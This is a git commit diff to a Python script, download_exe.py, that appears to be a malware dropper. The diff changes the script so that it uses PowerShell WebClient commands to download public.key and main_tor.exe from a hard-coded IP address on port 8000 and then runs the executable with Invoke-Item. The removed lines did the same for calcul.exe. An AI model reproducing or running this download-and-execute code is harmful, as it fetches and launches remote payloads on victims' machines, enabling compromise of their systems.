29b5d4d3428c910509c3067c23ed15193f5efd20
Clement <48801402+Clement17-rouault@users.noreply.github.com>
2022-07-14 18:20:26 +0200

    Update download_exe.py

--- download_exe.py
+++ download_exe.py
@@ -9,6 +9,8 @@ def test_access_to_webpage(url):
         if response.status_code == 200:
             print(f"[*] Access to the webpage: {url} : Success")
             return True
+        else:
+            return False
     except:
         print(f"[*] Access to the webpage: {url} : Failed")
         return False
@@ -17,11 +19,12 @@ def test_access_to_webpage(url):
 
 def main():
     print(u"Ici va télécharger l'exe")
-    url = "http://54.90.113.98:8000/calcul.exe"
+    url = "http://54.90.113.98:8000/"
     if test_access_to_webpage(url):
         try:
-            os.system(f"powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('{url}', '{Dropper.save_path}\\calcul.exe')")
-            os.popen(f"powershell.exe -Command Invoke-Item {Dropper.save_path}\\calcul.exe")
+            os.system(f"powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('{url}public.key', '{Dropper.save_path}\\public.key')")
+            os.system(f"powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('{url}main_tor.exe', '{Dropper.save_path}\\main_tor.exe')")
+            os.popen(f"powershell.exe -Command Invoke-Item {Dropper.save_path}\\main_tor.exe")
             return True
         except:
             print("Error")
@@ -29,3 +32,8 @@ def main():
     else:
         return False
 
+"""
+url = "http://54.90.113.98:8000/"
+print(f"{url}main_tor.exe")
+"""
+#main()
